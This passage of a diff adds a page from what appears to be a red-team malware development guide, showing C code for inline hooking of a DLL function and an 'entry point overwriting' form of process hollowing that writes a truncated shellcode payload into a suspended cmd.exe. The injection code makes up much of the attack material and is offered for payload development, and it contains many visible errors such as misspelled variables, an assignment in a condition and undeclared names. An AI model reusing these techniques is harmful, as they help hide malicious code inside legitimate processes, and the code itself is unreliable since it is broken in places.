+    entDll = LoadLibrary("entertainmentDll.dll");
+    origMovFunc = (OrigMovFunc)GetProcAddress(entDll, "Movie");
+
+    return (origMovFunc)("Everything, Everywhere, All At Once");
+}
+
+void installHook(){
+    HINSTANCE hLib;
+    DWORD oldProtect;
+
+    CHAR patch[14] = {0};
+    BYTE jmpInstruction[] = {0xFF, 0x25,0x00, 0x00, 0x00, 0x00 }
+    UINT_PTR hookFuncAddr;
+
+    hLib = LoadLibraryA("entertainmentDll.dll");
+    hookedFuncAddr = GetProcAddress(hLib, "Movie");
+
+    if(hokedFuncAddr = NULL){
+        printf("Failed to get `Movie` address.\n");
+        return 0;
+    }
+
+    ReadProcessMemory(GetCurrentProcess(), (LPVOID)hookedFuncAddr, origBytes, 14, NULL);
+    VirtualProtect((LPVOID)hookedFuncAddr, 14, PAGE_READWRITE, &amp;oldProtect);
+    hookFuncAddr = (UINT_PTR)&amp;modMovFunc;
+
+    memcpy(patch, jmpinstruction, 6);
+    memcpy(patch+6, &amp;hokFuncAddr, 8);
+
+    WriteProcessMemory(GetCurrentProcess(), (LPVOIDhookedFuncAddr, patch, 14, NULL);
+    VirtualProtect((LPVOID)hookedFuncAddr, 14, oldProtect, &amp;oldProtect);
+    FlushInstructionCache(GetCurrentProcess(), (LPVOID)hookedFuncAddr, 14);
+}
+
+int main() {
+    HINSTANCE entDll;
+    OrigMovFunc origMovFunc;
+
+    entDll = LoadLibrary("entertainmentDll.dll");
+    if(entDll == NULL){
+        return 1;
+    }
+
+    origMovFunc = (OrigMovFunc)GetProcAddress(entDll, "Movie");
+    if (origMovFunc == NULL){
+        return 1;
+    }
+
+    (origMovFunc)("Spider-Man: Across the Spider-Verse");
+    installhook();
+    (origMovFunc)("Spider-Man: Across the Spider-Verse");
+
+    return 0;
+}
+</code></pre>
+<p>Here's a breakdown of what happened:</p>
+<ul>
+<li><code>typedef int (__cdecl OrigMovFunc)</code>: Creates an alias, <code>OrigMovFunc</code>, for a function signature, allowing equivalent functions to be declared, defined, or referenced using that alias.</li>
+<li><code>void installHook(){...}</code>: A buffer is allocated for the 14-byte patch (our hook) inside the <code>Movie</code> function. The full, 6-byte <code>JMP</code> instruction opcode is written as a list of character codes. A 64-bit pointer is created to reference the modified <code>Movie</code> function, our hook function. Then, the first 14 bytes of the target function are saved and this memory space is made writable (<code>RW</code>). The <code>JMP</code> instruction and the 8 byte absolute address of the hook function are written into the beginning of the hooked function. Then, the permissions are reverted (<code>RX</code>) and the instruction cache is flushed.</li>
+<li><code>ReadProcessMemory</code>: Copies a specified block of memory from the address space of a designated process, into a buffer in the current process's address space. Requires having the <code>PROCESS_VM_READ</code> access right to the target process. It is a core component of the Windows API used to inspect the memory contents of a running application.
+<pre><code class="language-C">BOOL ReadProcessMemory(
+    [in] HANDLE hProcess,
+    [in] LPCVOID lpBaseAddress,
+    [out] LPVOID lpBuffer,
+    [in] SIZE_T nSize,
+    [out] SIZE_T *lpNmberofBytesRead
+);
+</code></pre>
+Here is a breakdown of the <code>ReadProcessMemory</code> function's parameters:
+<ul>
+<li><code>hProcess</code>: Handle to the target process whose memory is to be read. Must have the <code>PROESS_VM_READ</code> access right.</li>
+<li><code>lpBaseAddress</code>: The base virtual address in the target process from which the read operation should begin.</li>
+<li><code>lpBuffer</code>: A pointer to a buffer in the calling process's address space. The data read from the target process will be copied here.</li>
+<li><code>nSize</code>: The number of bytes to be copied from the target process's memory into your local buffer.</li>
+<li><code>lpNumberOfBytesRead</code>: An optional pointer to a variable that receives the actual number of bytes transferred into the local buffer. This can be less than <code>nSize</code> if the memory read fails partway through. If <code>NULL</code> it is ignored.</li>
+<li><code>ReadProcessMemory</code> returns <code>TRUE</code> is successful, <code>FALSE</code> if failure. Use <code>GetLastError()</code> to get more information.</li>
+</ul>
+</li>
+<li><code>int __stdcall modMovFunc (LPCTSTR message){...}</code>: The first 14 bytes of the hooked function are made writable, the original instruction bytes are written into that space and the permissions are reverted (<code>RX</code>). Then, the instruction cache is flushed and the original <code>Movie</code> function is called with a new parameter, "Everything, Everywhere, All At Once".</li>
+<li><code>FlushInstructionCache</code>: An essential Windows API that synchronizes the contents of the CPUs instruction cache and any non coherent caches with the contents of memory. FOrces the CPU to discard its stale cache entries and re-read the instructions from memory, guaranteeing that newly written code is executed immediately.
+<pre><code class="language-C">BOOL FlushInstructionCache(
+    [in] HANDLE hProcess,
+    [in] LPCVOID lpBaseAddress,
+    [in] SIZE_T dwSize
+);
+</code></pre>
+Here is a breakdown of the <code>FlushInstructionCache</code> function's parameters:
+<ul>
+<li><code>hProcess</code>: A handle to the process whose instruction cache is to be flushed.</li>
+<li><code>lpBaseAddress</code>: the base address in the target process where the modified region begins. <code>NULL</code> to flush entire cache.</li>
+<li><code>dwSize</code>: Size, in bytes, of the instruction region to be flushed.</li>
+</ul>
+</li>
+<li><code>int main(){...}</code>: Loads <code>entDll</code>, then runs the original <code>Movie</code> function. Next, the hook is installed and the original <code>Movie</code> function is called again.</li>
+</ul>
+<h3 id="process-hollowing"><a class="header" href="#process-hollowing">Process Hollowing</a></h3>
+<p>'Process Hollowing' is an attack method where an adversary starts a legitimate, benign process in a suspended state and then completely replaces its executable code with malicious content. The goal is for the malicious code to run under the guise and context of a legitimate process, making it much harder for security software and analysts to identify the true nature of the running program. There are <strong>6 Core Steps</strong> to process hollowing:</p>
+<ol>
+<li><strong>Creation of the Suspended Target Process</strong>: The injector uses the <code>CreateProcess</code> API with the <code>CREATE_SUSPENDED</code> flag to start with a new legitimate host process, but immediately freezes its main thread, preventing the host form executing its original code</li>
+<li><strong>Hollowing the Process</strong>: The injector analyzes the suspended process's memory to find it's Image Base Address. It then uses <code>NtUnmapViewOfSection</code> or a similar function to unmap the legitimate PE file from the process's memory space, leaving a large chunk of hollowed, unallocated memory.</li>
+<li><strong>Allocating Space for the Malicious Image</strong>: The injector allocates new memory space inside the hollowed process using <code>VirtualAllocEx</code> at the same preferred Image Base Address, or at least the same sized region, as the original executable.</li>
+<li><strong>Writing the Malicious Image</strong>: The injector writes the sections (i.e., <code>.text</code> or <code>.data</code>) of the malicious PE file into the newly allocated memory space within the target process using <code>WriteProcessMemory</code>.</li>
+<li><strong>Redirecting the Execution Flow</strong>: The injector modifies <code>RAX</code>/<code>EAX</code> of the suspended thread's context to point to the Entry Point of the newly injected malicious PE using <code>GetThreadContext</code> and <code>SetThreadContext</code>.</li>
+<li><strong>Resuming Execution</strong>: The injector calls <code>ResumeThread</code>, jumping directly to the entry point of the malicious code while still appearing in the operating system as a legitimate process.</li>
+</ol>
+<p><strong>Entry Point Overwriting</strong> is a simplified form of Process Hollowing that only hollows out the entry point with shellcode, without unmapping anything else. Here is an example:</p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    ULONG returnLength;
+    DWORD oldProtect;
+    PVOID baseAddress;
+    SIZE_T bytesRead;
+    SIZE_T bytesWritten;
+
+    unsigned char payload[] =
+    "\xfc\x48\x83..."
+    [...trunc...]
+    "...\xda\xff\xd5";
+
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    IMAGE_DOS_HEADER dHeader = {0};
+    IMAGE_NT_HEADERS ntHeaders = {0};
+
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    CreateProcessW(
+        L"C:\\Windows\\System32\\cmd.exe",
+        NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        L"C:\\Windows\\System32", &amp;si, &amp;pi
+    );
+
+    NtQueryInformationProcess(
+        pi.hProcess,
+        ProcessBasicInformation,
+        &amp;pbi,
+        sizeoff(pbi),
+        &amp;returnLength
+    );
+
+    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);
+    baseAddress = 0;
+    bytesRead = 0;
+    ReadProcessMemory(
+        pi.hProcess,
+        baseAddress,
+        &amp;dHeader,
+        sizeof(dHeader),
+        &amp;bytesRead
+    );
+
+    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);
+    ReadProcessMemory(
+        pi.hProcess,
+        lpNtHeader,
+        &amp;ntHeaders,
+        sizeof(ntHeaders),
+        &amp;bytesRead
+    );
+
+    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
+    VirtualProtectEx(
+        pi.hProcess,
+        entryPoint,
+        sizeof(payload),
+        PAGE_READWRITE,
+        &amp;oldProtect
+    );
+
+    WriteProcessMemory(
+        pi.hProcess,
+        entryPoint,
+        payload,
+        sizeof(payload),
+        &amp;bytesWritten
+    );
+
+    VirtualProtectEx(
+        pi.hProcess,
+        entryPoint,
+        sizeof(payload),
+        oldProtect,
+        &amp;oldProtect
+    );
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>NtQueryInformationProcess</code>: A Native API function in the Windows kernel, used to retrieve various pieces of non-public, specific information about a process object. Helps gather insights into a running process's state, environment and security context.</p>
+<ul>
+<li>Acts as a versatile internal query tool for the kernel's Object Manager. It takes a Process Handle and an information class, and fills a buffer with requested data, including:
+<ul>
+<li><code>Process Basic Information</code>: The entry point address, Process ID, Parent Process ID and the base address of the Process Environment Block (PEB).</li>
+<li><code>Process Image Filename</code>: The full path to the executable file.</li>
+<li><code>Process Breakpoints</code>: Information about breakpoints set within the process</li>
+<li><code>Process Security</code>: Details about the process's token and integrity level.</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-C">__NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess(
+    [in] HANDLE ProcessHandle,
+    [in] PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    [out] PVOID ProcessInformation,
+    [in] ULONG ProcessInformationLength,
+    [out, optional] PULONG ReturnLength
+)
+</code></pre>
+<p>Here is a breakdown of the <code>NtQueryInformationProcess</code> function's parameters:</p>
+<ul>
+<li><code>ProcessHandle</code>: A handle to the process about which information is being requested. This handle must have the appropriate access rights (i.e., <code>PROCESS_QUERY_INFORMATION</code>).</li>
+<li><code>ProcessInformationClass</code>: A value from the enumeration that specifies the exact type of information to retrieve.
+<ul>
+<li><code>ProcessBasicInformation</code>: Gets a <code>PROCESS_BASIC_INFORMATION</code> structure, which contains essential process details like the exit status, the base address of the PEB, the Process ID, and the Parent Process ID.</li>
+<li><code>ProcessImageFileName</code>: Retrieves the full path and file name of the executable image for the process.</li>
+<li><code>ProcessWow64Information</code>: Used on 64-bit systems to determine if a process is a 32-bit application running under the WoW64 compatability layer.</li>
+<li><code>ProcessSessionInformation</code>: Gets the Terminal Services Session ID, needed to manage or communicate with processes across different user sessions.</li>
+<li><code>ProcessDebugPort</code>: Gets the debug port number, used by debuggers to check if a process is being debugged.</li>
+<li><code>ProcessHandleCount</code>: Used to get the number of open handles currently owned by the process.</li>
+<li><code>ProcessQuotaLimits</code>: Gathers information about a process's page file usage, working set size limits, etc. to monitor and manage process resource consumption.</li>
+</ul>
+</li>
+<li><code>ProcessInformation</code>: A pointer to a buffer that receives the requested process information, formatted based on the <code>ProcessInformationClass</code>.</li>
+<li><code>ProcessInformationLength</code>: The size, in bytes of the output buffer pointed to by <code>ProcessInformation</code>.</li>
+<li><code>ReturnLength</code>: An optional pointer to a variable that receives the actual size, in bytes of the information returned in the buffer.</li>
+</ul>
+<p><code>NtQueryInformationProcess</code> returns an <code>NTSTATUS</code> value. <code>STATUS_SUCCESS</code> indicates the operation completed successfully.</p>
+</li>
+<li>
+<p><code>auto</code>: An instruction in <code>C++</code>, which tells the compiler to automatically deduce the data type of the variable from the type of its initializer.</p>
+</li>
+<li>
+<p><code>IMAGE_DOS_HEADER</code>: A data type which is used to create a structure representing the legacy header found at the very start of a PE file.</p>
+</li>
+<li>
+<p><code>IMAGE_NT_HEADERS</code>: The primary entry point for the modern Windows Operating System loader, located at the file offset value specified by the <code>e_lfanew</code> field of the proceeding <code>IMAGE_DOS_HEADER</code>.</p>
+</li>
+<li>
+<p><code>VirtualProtectEx</code>: A fundamental function in the Windows Memory management PAI, used to change the protection attributes of a region of memory within the address space of a specified process. It is exported by <code>kernel32.dll</code>.</p>
+<pre><code class="language-C">BOOL VirtualProtectEx(
+    [in] HANDLE hProcess,
+    [in] LPVOID lpAddress,
+    [in] SIZE_T dwSize,
+    [in] DWORD flNewProtect,
+    [out] PDWORD lpflOldProtect
+);
+</code></pre>
+<p>Here is a breakdown of the <code>VirtualProtectEx</code> function's parameters:</p>
+<ul>
+<li><code>hProcess</code>: A handle to the target process whose memory protection is to be changed. The handle must have the <code>PROCESS_VM_OPERATION</code> access right.</li>
+<li><code>lpAddress</code>: The base address of the region of memory pages whose protection attributes are to be changed.</li>
+<li><code>dwSize</code>: The size, in bytes of the region whose protection attributes are to be changed. The region is extended to encompass all memory pages in the range.</li>
+<li><code>flNewProtect</code>: The new memory protection options (i.e., <code>PAGE_EXECUTE_READ</code>)</li>
+<li><code>lpflOldProtect</code>: A pointer to a variable that receives the previous protection attributes of the first page in the specified region. This is essential for restoring permissions later.</li>
+</ul>
+</li>
+</ul>
+<h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
+<p>Malware generally describes any software designed to facilitate malicious actions on a computer system. Fundamentally, it takes advantage of vulnerabilities identified by a developer, which allow them to access accounts, gather data, and/or manipulate access to programs and services. Typically, some form of communication channel is established between a remote, target machine and the machine the attack was initialized from, such as a reverse shell, which manages communication between the two machines, allowing the transmission of instructions and data at each end. Malware development plays a very important role in managing Red Team Operations. Even though there are tools that exist which can automatically generate payloads of many forms, understanding the low-level functions and configurations of these payloads significantly contributes to whether or not the payload can actually be downloaded and run on a target system.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Windows.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="Persistence.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Windows.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="Persistence.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
